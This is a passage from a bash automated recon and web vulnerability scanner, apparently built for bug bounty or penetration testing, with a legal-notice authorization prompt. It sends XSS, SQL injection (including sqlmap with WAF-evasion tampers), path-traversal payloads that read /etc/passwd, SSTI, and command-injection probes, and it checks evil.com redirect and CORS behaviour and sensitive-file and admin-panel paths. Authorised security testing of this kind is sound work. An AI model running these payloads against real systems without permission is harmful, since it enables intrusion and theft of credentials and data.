      hostname=$(echo "$url" | sed 's|https\?://||' | tr '/:' '__')
      info "ffuf on $url …"
      ffuf -u "$url/FUZZ" \
        -w "$WORDLIST" \
        -mc 200,204,301,302,307,401,403,405 \
        -t "$THREADS" \
        -timeout "$TIMEOUT" \
        -of json \
        -o "$fuzz_dir/ffuf_${hostname}.json" \
        -s 2>/dev/null || true
    done < <(head -5 "$live_urls")  # limit to 5 targets
    success "ffuf results in $fuzz_dir/"
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 8 — Vulnerability Scanning
# ═══════════════════════════════════════════════════════════
phase8_vulns() {
  phase "PHASE 8 — Vulnerability Scanning"
  local vuln_dir="$OUT/vulns"
  local live_urls="$OUT/live_urls.txt"
  local param_urls="$OUT/params/all_param_urls.txt"
  local all_urls="$OUT/urls/all_urls.txt"

  # ── 8a. Nuclei (template-based — covers 100s of CVEs + misconfigs) ──
  if command -v nuclei &>/dev/null && [[ -f "$live_urls" ]]; then
    info "Running nuclei (critical/high/medium severity) …"
    nuclei -l "$live_urls" \
      -severity critical,high,medium \
      -silent \
      -rate-limit 50 \
      -bulk-size 25 \
      -o "$vuln_dir/nuclei.txt" 2>/dev/null \
      && success "nuclei: $(count_lines "$vuln_dir/nuclei.txt") findings"

    # Nuclei: specific template categories
    for tag in cves misconfig exposures takeovers default-logins; do
      info "nuclei [$tag] …"
      nuclei -l "$live_urls" \
        -tags "$tag" -silent \
        -rate-limit 30 \
        -o "$vuln_dir/nuclei_${tag}.txt" 2>/dev/null || true
    done
  fi

  # ── 8b. XSS — kxss (fast reflection) + dalfox (deep confirmation) ──
  local xss_input="$OUT/params/hint_xss.txt"
  [[ ! -s "$xss_input" ]] && xss_input="$param_urls"

  # kxss — pipe URLs, flag any that reflect dangerous chars
  if command -v kxss &>/dev/null && [[ -s "$xss_input" ]]; then
    info "Running kxss (fast XSS reflection check) …"
    cat "$xss_input" \
      | kxss 2>/dev/null \
      | sort -u > "$vuln_dir/kxss_reflected.txt" || true
    [[ -s "$vuln_dir/kxss_reflected.txt" ]] \
      && found "kxss: $(count_lines "$vuln_dir/kxss_reflected.txt") reflected inputs → $vuln_dir/kxss_reflected.txt" \
      || success "kxss: no dangerous reflections found"
  fi

  # Manual reflection probe — check if input is echoed unencoded
  if [[ -s "$xss_input" ]]; then
    info "Probing XSS with basic reflection payloads …"
    local xss_probe_out="$vuln_dir/xss_reflected_probe.txt"
    > "$xss_probe_out"
    local XSS_MARKER="xsspr0be1337"
    local XSS_PAYLOADS=(
      "<$XSS_MARKER>"
      "\">${XSS_MARKER}<\""
      "'>${XSS_MARKER}<'"
      "<script>${XSS_MARKER}</script>"
      "<img src=x onerror=${XSS_MARKER}>"
      "javascript:${XSS_MARKER}"
    )
    while IFS= read -r url; do
      for payload in "${XSS_PAYLOADS[@]}"; do
        test_url=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "$url")
        if curl -sk --max-time "$TIMEOUT" "$test_url" 2>/dev/null \
             | grep -qF "$XSS_MARKER"; then
          echo "[XSS-REFLECT] payload='$payload' → $test_url" >> "$xss_probe_out"
          found "[XSS-REFLECT] $test_url"
          break
        fi
      done
    done < <(head -100 "$xss_input")
    [[ -s "$xss_probe_out" ]] \
      && found "XSS reflection hits → $xss_probe_out ($(count_lines "$xss_probe_out"))" \
      || success "No raw XSS reflections found"
  fi

  # dalfox — deep scan with WAF evasion on confirmed reflection hits or full list
  local dalfox_input="$vuln_dir/xss_reflected_probe.txt"
  if [[ ! -s "$dalfox_input" ]]; then dalfox_input="$xss_input"; fi
  if command -v dalfox &>/dev/null && [[ -s "$dalfox_input" ]]; then
    info "Running dalfox (deep XSS) …"
    dalfox file "$dalfox_input" \
      --skip-bav \
      --no-color \
      --silence \
      --format json \
      -o "$vuln_dir/dalfox_xss.json" 2>/dev/null || true
    # Extract confirmed hits to plain text
    python3 -c "
import json, sys
try:
  data = json.load(open('$vuln_dir/dalfox_xss.json'))
  items = data if isinstance(data, list) else [data]
  for r in items:
    t = r.get('type',''); p = r.get('param',''); poc = r.get('poc', r.get('inject_url',''))
    if t and poc: print(f'[{t}] param={p} → {poc}')
except: pass
" > "$vuln_dir/dalfox_confirmed.txt" 2>/dev/null || true
    [[ -s "$vuln_dir/dalfox_confirmed.txt" ]] \
      && found "dalfox confirmed XSS → $vuln_dir/dalfox_confirmed.txt ($(count_lines "$vuln_dir/dalfox_confirmed.txt"))" \
      || info "dalfox done — raw output: $vuln_dir/dalfox_xss.json"
  fi

  # ── 8c. SQL Injection — error-based auto-probe ──────────────────────
  local sqli_input="$OUT/params/gf_sqli.txt"
  [[ ! -s "$sqli_input" ]] && sqli_input="$OUT/params/hint_sqli.txt"

  if [[ -s "$sqli_input" ]]; then
    cp "$sqli_input" "$vuln_dir/sqli_candidates.txt"
    info "SQLi candidates: $(count_lines "$sqli_input") URLs — probing for errors …"

    local sqli_errors="$vuln_dir/sqli_errors.txt"
    > "$sqli_errors"
    local SQL_PAYLOADS=("'" '"' "1'" "1 OR 1=1--" "' OR '1'='1'--" "1'/*" "\\")
    local SQL_ERR_PAT="mysql_fetch|mysql_num_rows|ORA-[0-9]+|Microsoft OLE DB|Unclosed quotation mark|You have an error in your SQL syntax|SQLSTATE\[|SQLite3::|pg_query\(\)|Warning.*mysql_|syntax error.*near|Incorrect syntax near|unterminated quoted string|supplied argument is not a valid MySQL|Syntax error in string in query expression"

    while IFS= read -r url; do
      for payload in "${SQL_PAYLOADS[@]}"; do
        test_url=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "$url")
        if curl -sk --max-time "$TIMEOUT" "$test_url" 2>/dev/null \
             | grep -qiP "$SQL_ERR_PAT"; then
          echo "[SQLi-ERROR] $test_url" | tee -a "$sqli_errors"
          found "[SQLi-ERROR] $test_url"
          break
        fi
      done
    done < <(head -150 "$sqli_input")
    [[ -s "$sqli_errors" ]] \
      && found "Error-based SQLi → $sqli_errors ($(count_lines "$sqli_errors") hits)" \
      || success "No error-based SQLi responses found"

    # Boolean-based blind probe — compare true vs false response lengths
    info "Probing boolean-based blind SQLi …"
    local sqli_blind="$vuln_dir/sqli_blind.txt"
    > "$sqli_blind"
    while IFS= read -r url; do
      len_true=$(curl -sk --max-time "$TIMEOUT" \
        "$(echo "$url" | qsreplace "1 AND 1=1--" 2>/dev/null || echo "$url")" \
        2>/dev/null | wc -c)
      len_false=$(curl -sk --max-time "$TIMEOUT" \
        "$(echo "$url" | qsreplace "1 AND 1=2--" 2>/dev/null || echo "$url")" \
        2>/dev/null | wc -c)
      diff=$(( len_true - len_false ))
      [[ $diff -lt 0 ]] && diff=$(( -diff ))
      if [[ $diff -gt 50 ]]; then
        echo "[SQLi-BLIND?] diff=${diff}bytes → $url" >> "$sqli_blind"
        warn "[SQLi-BLIND?] response size differs by ${diff}b: $url"
      fi
    done < <(head -50 "$sqli_input")
    [[ -s "$sqli_blind" ]] \
      && found "Possible blind SQLi → $sqli_blind ($(count_lines "$sqli_blind") candidates, verify manually)" \
      || success "No obvious blind SQLi candidates"
  fi

  # ── 8d. SQLmap — auto-run on confirmed/candidate targets ────────────
  if ! $SKIP_HEAVY && command -v sqlmap &>/dev/null; then
    local sqlmap_input="$vuln_dir/sqli_errors.txt"
    # Prefer confirmed error hits; fall back to all candidates
    if [[ ! -s "$sqlmap_input" ]]; then sqlmap_input="$vuln_dir/sqli_candidates.txt"; fi
    if [[ -s "$sqlmap_input" ]]; then
      # Extract just the URLs from lines like "[SQLi-ERROR] http://..."
      grep -oP 'https?://\S+' "$sqlmap_input" 2>/dev/null \
        | sort -u > "$vuln_dir/sqlmap_targets.txt" || \
        cp "$sqlmap_input" "$vuln_dir/sqlmap_targets.txt"
      info "Running sqlmap (batch, level 3, risk 2) on $(count_lines "$vuln_dir/sqlmap_targets.txt") targets …"
      sqlmap -m "$vuln_dir/sqlmap_targets.txt" \
        --batch \
        --level=3 --risk=2 \
        --random-agent \
        --forms \
        --tamper=space2comment,between \
        --output-dir="$vuln_dir/sqlmap" \
        2>/dev/null || true
      success "sqlmap done → $vuln_dir/sqlmap/"
    fi
  fi

  # ── 8e. Open Redirect check ────────────────────────────────────────
  if [[ -f "$OUT/params/gf_redirect.txt" ]] && command -v qsreplace &>/dev/null; then
    info "Checking open redirects …"
    cat "$OUT/params/gf_redirect.txt" \
      | qsreplace "https://evil.com" \
      | xargs -P20 -I{} curl -sk -o /dev/null -w "%{url_effective} %{http_code}\n" \
          --max-time "$TIMEOUT" -L "{}" 2>/dev/null \
      | grep "evil.com" \
      > "$vuln_dir/open_redirects.txt" 2>/dev/null || true
    [[ -s "$vuln_dir/open_redirects.txt" ]] \
      && found "Open redirects → $vuln_dir/open_redirects.txt" \
      || success "No open redirects confirmed"
  fi

  # ── 8f. SSRF probe ─────────────────────────────────────────────────
  if [[ -f "$OUT/params/gf_ssrf.txt" ]] && command -v qsreplace &>/dev/null; then
    info "Checking SSRF candidates …"
    warn "Set SSRF_CALLBACK to your Burp Collaborator / interactsh URL for live detection"
    SSRF_CALLBACK="${SSRF_CALLBACK:-https://ssrf.burpcollaborator.net}"
    cat "$OUT/params/gf_ssrf.txt" \
      | qsreplace "$SSRF_CALLBACK" \
      > "$vuln_dir/ssrf_probes.txt" 2>/dev/null || true
    info "SSRF probe URLs written to $vuln_dir/ssrf_probes.txt"
    info "Send them and check your callback server for DNS/HTTP hits"
  fi

  # ── 8g. Security headers check via curl ────────────────────────────
  info "Checking security headers on live URLs …"
  local headers_out="$vuln_dir/missing_headers.txt"
  > "$headers_out"
  REQUIRED_HEADERS=(
    "Content-Security-Policy"
    "Strict-Transport-Security"
    "X-Frame-Options"
    "X-Content-Type-Options"
    "Referrer-Policy"
    "Permissions-Policy"
  )
  if [[ -f "$live_urls" ]]; then
    while IFS= read -r url; do
      headers=$(curl -sk --max-time "$TIMEOUT" -I "$url" 2>/dev/null)
      for h in "${REQUIRED_HEADERS[@]}"; do
        if ! echo "$headers" | grep -qi "$h"; then
          echo "MISSING $h  →  $url" >> "$headers_out"
        fi
      done
    done < "$live_urls"
    [[ -s "$headers_out" ]] \
      && warn "Missing headers → $headers_out ($(count_lines "$headers_out") issues)" \
      || success "All security headers present"
  fi

  # ── 8h. CORS misconfiguration ──────────────────────────────────────
  info "Checking CORS misconfiguration …"
  local cors_out="$vuln_dir/cors.txt"
  > "$cors_out"
  if [[ -f "$live_urls" ]]; then
    while IFS= read -r url; do
      acao=$(curl -sk --max-time "$TIMEOUT" \
        -H "Origin: https://evil.com" -I "$url" 2>/dev/null \
        | grep -i "access-control-allow-origin" | tr -d '\r')
      acac=$(curl -sk --max-time "$TIMEOUT" \
        -H "Origin: https://evil.com" -I "$url" 2>/dev/null \
        | grep -i "access-control-allow-credentials" | tr -d '\r')
      if echo "$acao" | grep -qi "evil.com"; then
        echo "[CORS] Origin reflected: $url  ($acao)" >> "$cors_out"
      fi
      if echo "$acao" | grep -qi "\*" && echo "$acac" | grep -qi "true"; then
        echo "[CORS CRITICAL] ACAO=* + credentials=true: $url" >> "$cors_out"
      fi
    done < "$live_urls"
    [[ -s "$cors_out" ]] \
      && found "CORS issues → $cors_out" \
      || success "No obvious CORS misconfigs"
  fi

  # ── 8i. Sensitive file exposure ─────────────────────────────────────
  info "Probing for sensitive exposed files …"
  local sens_out="$vuln_dir/sensitive_files.txt"
  > "$sens_out"
  SENSITIVE=(
    "/.git/HEAD" "/.git/config" "/.env" "/.env.backup" "/.env.local"
    "/wp-config.php" "/config.php" "/config.js" "/web.config"
    "/phpinfo.php" "/info.php" "/.htaccess" "/.htpasswd"
    "/backup.zip" "/backup.sql" "/db.sql" "/database.sql"
    "/swagger.json" "/swagger.yaml" "/openapi.json" "/api-docs"
    "/graphql" "/graphiql" "/actuator" "/actuator/env" "/actuator/health"
    "/actuator/mappings" "/.DS_Store" "/server-status" "/server-info"
    "/robots.txt" "/sitemap.xml" "/crossdomain.xml" "/clientaccesspolicy.xml"
    "/package.json" "/composer.json" "/Dockerfile" "/docker-compose.yml"
    "/phpmyadmin/" "/adminer.php" "/admin/" "/_debug" "/debug"
  )
  if [[ -f "$OUT/live_domains.txt" ]]; then
    while IFS= read -r domain; do
      for path in "${SENSITIVE[@]}"; do
        url="https://${domain}${path}"
        code=$(curl -sk --max-time "$TIMEOUT" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
        if [[ "$code" == "200" || "$code" == "403" ]]; then
          echo "[$code] $url" >> "$sens_out"
          [[ "$code" == "200" ]] && warn "[$code] $url"
        fi
      done
    done < <(head -5 "$OUT/live_domains.txt")
  fi
  [[ -s "$sens_out" ]] \
    && found "Sensitive files → $sens_out ($(count_lines "$sens_out") hits)" \
    || success "No sensitive files found"

  # ── 8j. Subdomain Takeover ─────────────────────────────────────────
  if command -v nuclei &>/dev/null && [[ -f "$OUT/subdomains/all_subdomains.txt" ]]; then
    info "Checking subdomain takeover …"
    nuclei -l "$OUT/subdomains/all_subdomains.txt" \
      -t "~/nuclei-templates/takeovers/" \
      -silent \
      -o "$vuln_dir/takeovers.txt" 2>/dev/null || true
    [[ -s "$vuln_dir/takeovers.txt" ]] \
      && found "Takeover candidates → $vuln_dir/takeovers.txt" \
      || success "No takeover candidates"
  fi

  # ── 8k. nikto (web server misconfiguration) ────────────────────────
  if command -v nikto &>/dev/null && [[ -f "$OUT/live_domains.txt" ]]; then
    info "Running nikto on first 3 live domains …"
    head -3 "$OUT/live_domains.txt" | while IFS= read -r d; do
      nikto -h "https://$d" -nointeractive \
        -output "$vuln_dir/nikto_${d//./_}.txt" \
        2>/dev/null || true
    done
    success "nikto done"
  fi

  # ── 8l. LFI / Path Traversal — auto-probe ───────────────────────────
  local lfi_input="$OUT/params/gf_lfi.txt"
  [[ ! -s "$lfi_input" ]] && lfi_input="$OUT/params/hint_lfi.txt"

  if [[ -s "$lfi_input" ]]; then
    info "Probing for LFI / path traversal …"
    local lfi_out="$vuln_dir/lfi_hits.txt"
    > "$lfi_out"
    local LFI_PAYLOADS=(
      "../../../etc/passwd"
      "../../../../etc/passwd"
      "../../../../../etc/passwd"
      "....//....//....//etc/passwd"
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      "..%2f..%2f..%2fetc%2fpasswd"
      "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
      "/etc/passwd"
      "php://filter/convert.base64-encode/resource=index"
      "file:///etc/passwd"
      "/proc/self/environ"
      "....\\....\\....\\windows\\win.ini"
      "%2e%2e%5cetc%2fpasswd"
    )
    local LFI_SIG="root:x:0:0|bin:x:|daemon:x:|\\[extensions\\]|for 16-bit app"

    while IFS= read -r url; do
      for payload in "${LFI_PAYLOADS[@]}"; do
        test_url=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "$url")
        if curl -sk --max-time "$TIMEOUT" "$test_url" 2>/dev/null \
             | grep -qP "$LFI_SIG"; then
          echo "[LFI] payload='$payload' → $test_url" | tee -a "$lfi_out"
          found "[LFI] $test_url"
          break
        fi
      done
    done < <(head -100 "$lfi_input")
    [[ -s "$lfi_out" ]] \
      && found "LFI confirmed → $lfi_out ($(count_lines "$lfi_out") hits)" \
      || success "No LFI confirmed"
  fi

  # ── 8m. SSTI — template injection probe ────────────────────────────
  local ssti_input="$OUT/params/hint_ssti.txt"
  [[ ! -s "$ssti_input" ]] && ssti_input="$OUT/params/gf_ssti.txt"
  [[ ! -s "$ssti_input" ]] && ssti_input="$OUT/params/all_param_urls.txt"

  if [[ -s "$ssti_input" ]]; then
    info "Probing for SSTI (template injection) …"
    local ssti_out="$vuln_dir/ssti_hits.txt"
    > "$ssti_out"
    # Payloads that evaluate to 13457633 across engines (Jinja2/Twig/EL/ERB/Smarty)
    local SSTI_PAYLOADS=(
      "{{13337*1009}}"
      "\${13337*1009}"
      "<%= 13337*1009 %>"
      "#{13337*1009}"
      "{13337*1009}"
      "*{13337*1009}"
      "{{13337|int * 1009}}"
    )
    while IFS= read -r url; do
      for payload in "${SSTI_PAYLOADS[@]}"; do
        test_url=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "$url")
        resp=$(curl -sk --max-time "$TIMEOUT" "$test_url" 2>/dev/null)
        # Result 13457633 should appear; the literal payload should NOT (proving eval)
        if echo "$resp" | grep -qF "13457633" && \
           ! echo "$resp" | grep -qF "$payload"; then
          echo "[SSTI] engine=? payload='$payload' → $test_url" | tee -a "$ssti_out"
          found "[SSTI] $test_url"
          break
        fi
      done
    done < <(head -80 "$ssti_input")
    [[ -s "$ssti_out" ]] \
      && found "SSTI confirmed → $ssti_out ($(count_lines "$ssti_out") hits)" \
      || success "No SSTI confirmed"
  fi

  # ── 8n. Command Injection — time-based probe ───────────────────────
  local cmdi_input="$OUT/params/hint_cmdi.txt"
  [[ ! -s "$cmdi_input" ]] && cmdi_input="$OUT/params/gf_rce.txt"
  [[ ! -s "$cmdi_input" ]] && cmdi_input="$param_urls"

  if [[ -s "$cmdi_input" ]]; then
    info "Probing for command injection (time-based, 5 s delay) …"
    local cmdi_out="$vuln_dir/cmdi_hits.txt"
    > "$cmdi_out"
    local CMDI_PAYLOADS=(
      ";sleep 5"
      "| sleep 5"
      "\`sleep 5\`"
      "& sleep 5 &"
      "%3Bsleep+5"
      "||sleep 5||"
      "$(sleep 5)"
    )
    while IFS= read -r url; do
      for payload in "${CMDI_PAYLOADS[@]}"; do
        test_url=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "$url")
        start=$SECONDS
        curl -sk --max-time 15 "$test_url" -o /dev/null 2>/dev/null || true
        elapsed=$(( SECONDS - start ))
        if [[ $elapsed -ge 4 ]]; then
          echo "[CMDi-TIME] delay=${elapsed}s payload='$payload' → $test_url" | tee -a "$cmdi_out"
          found "[CMDi-TIME] ${elapsed}s delay on $test_url"
          break
        fi
      done
    done < <(head -40 "$cmdi_input")
    [[ -s "$cmdi_out" ]] \
      && found "CMDi time-based → $cmdi_out ($(count_lines "$cmdi_out") hits, verify manually)" \
      || success "No time-based CMDi confirmed"
  fi

  # ── 8o. Admin / login panel discovery ──────────────────────────────
  if [[ -f "$OUT/live_domains.txt" ]]; then
    info "Discovering admin / login panels …"
    local admin_out="$vuln_dir/admin_panels.txt"
    > "$admin_out"
    local ADMIN_PATHS=(
      "/admin" "/admin/" "/admin/login" "/admin/login.php" "/admin/index.php"
      "/administrator" "/administrator/index.php" "/administrator/login"
      "/wp-admin" "/wp-login.php" "/login" "/login.php" "/login.aspx"
      "/user/login" "/auth/login" "/account/login" "/signin" "/sign-in"
      "/panel" "/cpanel" "/controlpanel" "/manage" "/management"
      "/dashboard" "/portal" "/backend" "/staff" "/superuser"
      "/console" "/system" "/phpmyadmin" "/pma" "/adminer.php"
      "/jenkins" "/jira" "/confluence" "/grafana" "/kibana"
      "/manager/html" "/host-manager/html" "/solr" "/elmah.axd"
      "/.htaccess" "/server-status" "/_admin" "/siteadmin"
    )
    while IFS= read -r domain; do
      for path in "${ADMIN_PATHS[@]}"; do
        for scheme in https http; do
          url="${scheme}://${domain}${path}"
          code=$(curl -sk --max-time "$TIMEOUT" -o /dev/null \
            -w "%{http_code}" "$url" 2>/dev/null)
          if [[ "$code" =~ ^(200|301|302|401|403)$ ]]; then
            echo "[$code] $url" >> "$admin_out"
            [[ "$code" == "200" ]] && found "[$code] $url"
          fi
        done
      done
    done < <(head -10 "$OUT/live_domains.txt")
    [[ -s "$admin_out" ]] \
      && success "Admin panels → $admin_out ($(count_lines "$admin_out") hits)" \
      || success "No admin panels found"
  fi

  # ── 8p. IDOR — generate ±1 test URLs on numeric ID params ──────────
  local idor_input="$OUT/params/hint_idor.txt"
  [[ ! -s "$idor_input" ]] && idor_input="$OUT/params/gf_idor.txt"

  if [[ -s "$idor_input" ]]; then
    info "Generating IDOR test URLs (±1 on numeric ID params) …"
    local idor_out="$vuln_dir/idor_test_urls.txt"
    > "$idor_out"
    while IFS= read -r url; do
      # For every ?param=NNN or &param=NNN, emit ±1 variants
      while IFS= read -r match; do
        param=$(echo "$match" | cut -d= -f1 | sed 's/^[?&]//')
        val=$(echo "$match" | cut -d= -f2)
        if [[ "$val" =~ ^[0-9]+$ ]] && [[ "$val" -gt 0 ]]; then
          echo "$url" | sed "s/\([?&]\)${param}=${val}/\1${param}=$(( val + 1 ))/" >> "$idor_out"
          echo "$url" | sed "s/\([?&]\)${param}=${val}/\1${param}=$(( val - 1 ))/" >> "$idor_out"
        fi
      done < <(echo "$url" | grep -oP '[?&][a-zA-Z0-9_-]+=\d+')
    done < <(head -200 "$idor_input")
    sort -u -o "$idor_out" "$idor_out"
    [[ -s "$idor_out" ]] \
      && found "IDOR test URLs → $idor_out ($(count_lines "$idor_out") variants — test manually for auth bypass)" \
      || success "No numeric-ID params found for IDOR"
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 9 — Generate Summary Report
# ═══════════════════════════════════════════════════════════
phase9_report() {
  phase "PHASE 9 — Final Summary Report"

  local report="$OUT/SUMMARY.txt"
  local vuln_dir="$OUT/vulns"

  {
    echo "======================================================"
    echo "  RECON SUMMARY — $DOMAIN"
    echo "  $(date)"
    echo "======================================================"
    echo ""
    echo "[SUBDOMAINS]"
    echo "  All found     : $(count_lines "$OUT/subdomains/all_subdomains.txt")"
    echo "  Resolved      : $(count_lines "$OUT/subdomains/resolved.txt")"
    echo "  Live domains  : $(count_lines "$OUT/live_domains.txt")"
    echo "  Dead domains  : $(count_lines "$OUT/dead_domains.txt")"
    echo ""
    echo "[URLS]"
    echo "  Wayback       : $(count_lines "$OUT/urls/wayback.txt")"
    echo "  GAU           : $(count_lines "$OUT/urls/gau.txt")"
    echo "  Katana        : $(count_lines "$OUT/urls/katana.txt")"
    echo "  All unique    : $(count_lines "$OUT/urls/all_urls.txt")"
    echo ""
    echo "[JS FILES]"
    echo "  JS URLs       : $(count_lines "$OUT/js/js_urls.txt")"
    echo "  LinkFinder EP : $(count_lines "$OUT/js/linkfinder_endpoints.txt")"
    echo "  Secret hints  : $(count_lines "$OUT/js/js_secrets.txt")"
    echo ""
    echo "[PARAMETERS]"
    echo "  Param URLs     : $(count_lines "$OUT/params/all_param_urls.txt")"
    echo "  With ?         : $(count_lines "$OUT/params/urls_with_question.txt")"
    echo "  With =         : $(count_lines "$OUT/params/urls_with_equals.txt")"
    echo "  Unique params  : $(count_lines "$OUT/params/unique_param_names.txt")"
    echo "  Interesting    : $(count_lines "$OUT/params/interesting_params.txt")"
    echo ""
    echo "[URL HINTS BY VULN CLASS]"
    for hint in redirect_ssrf lfi idor sqli xss ssti cmdi; do
      f="$OUT/params/hint_${hint}.txt"
      [[ -f "$f" ]] && printf "  %-18s : %s URLs\n" "$hint" "$(count_lines "$f")"
    done
    echo ""
    echo "[VULNERABILITY FINDINGS]"
    declare -A VULN_LABELS=(
      ["kxss_reflected.txt"]="XSS reflections (kxss)"
      ["xss_reflected_probe.txt"]="XSS reflections (manual)"
      ["dalfox_confirmed.txt"]="XSS confirmed (dalfox)"
      ["sqli_errors.txt"]="SQLi error-based"
      ["sqli_blind.txt"]="SQLi blind candidates"
      ["lfi_hits.txt"]="LFI / path traversal"
      ["ssti_hits.txt"]="SSTI confirmed"
      ["cmdi_hits.txt"]="CMDi time-based"
      ["open_redirects.txt"]="Open redirects"
      ["cors.txt"]="CORS misconfig"
      ["sensitive_files.txt"]="Sensitive files exposed"
      ["missing_headers.txt"]="Missing security headers"
      ["takeovers.txt"]="Subdomain takeover"
      ["admin_panels.txt"]="Admin panels found"
      ["idor_test_urls.txt"]="IDOR test URLs (manual)"
      ["ssrf_probes.txt"]="SSRF probe URLs"
      ["nuclei.txt"]="Nuclei findings"
    )
    for key in "${!VULN_LABELS[@]}"; do
      f="$vuln_dir/$key"
      [[ -f "$f" ]] && [[ -s "$f" ]] && \
        printf "  %-35s : %s\n" "${VULN_LABELS[$key]}" "$(count_lines "$f")"
    done
    echo ""
    echo "[OUTPUT DIRECTORY]"
    echo "  $OUT"
    echo ""
    echo "======================================================"
  } | tee "$report"

  echo ""
  success "Full results saved to: $OUT"
}

# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════
main() {
  banner

  echo -e "${YELLOW}${BOLD}"
  echo "  ══════════════════════════════════════════════════"
  echo "   LEGAL NOTICE: Only scan systems you own or have"
  echo "   EXPLICIT WRITTEN permission to test."
  echo "   Unauthorized scanning is ILLEGAL."
  echo "  ══════════════════════════════════════════════════"
  echo -e "${NC}"
  read -rp "  Do you have authorization to scan $DOMAIN? [y/N]: " confirm
  [[ "${confirm,,}" != "y" ]] && { error "Aborted."; exit 1; }

  make_resolvers
  check_and_install_tools

  phase1_subdomains
  phase2_live
  phase3_urls
  phase4_js
  phase5_params
  phase6_ports
  phase7_fuzz
  phase8_vulns
  phase9_report

  echo -e "\n${GREEN}${BOLD}[✓] Scan complete! → $OUT${NC}\n"
}

main
